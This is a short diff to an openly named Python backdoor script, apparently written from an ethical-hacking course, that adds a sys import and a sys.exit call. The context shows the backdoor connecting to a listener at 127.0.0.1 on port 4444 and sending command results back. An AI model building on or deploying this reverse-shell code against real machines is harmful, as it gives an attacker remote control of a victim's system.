@@ -1,6 +1,6 @@
 # Many thanks to thenewboston, zaid sabih and udemy.com
 # Created by foxsinofgreed
-import socket, json, os
+import socket, json, os, sys
 import subprocess
 import base64
 
@@ -83,6 +83,7 @@ class Backdoor:
             self.reliable_send(command_result)
 
         self.connection.close()
+        sys.exit()
 
 
 my_backdoor = Backdoor("127.0.0.1", 4444)
